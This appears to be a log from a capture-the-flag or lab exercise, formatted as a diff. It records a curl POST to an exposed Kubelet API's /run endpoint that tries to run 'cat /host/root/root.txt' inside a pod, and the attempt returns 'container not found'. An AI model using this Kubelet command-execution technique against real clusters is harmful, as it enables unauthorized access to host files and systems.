@@ -1,0 +1,10 @@
+### [2026-04-05 11:02:59] curl -k -X POST https://10.129.96.167:10250/run/default/root-shell/root-shell -d cmd=cat /host/root/root.txt
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/root-shell/root-shell -d cmd=cat /host/root/root.txt
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100     61 100     34 100     27    808    642                              0100     61 100     34 100     27    807    641                              0100     61 100     34 100     27    807    640                              0
+container not found ("root-shell")
+# Exit code: 0
+# Duration: 2026-04-05 11:02:59
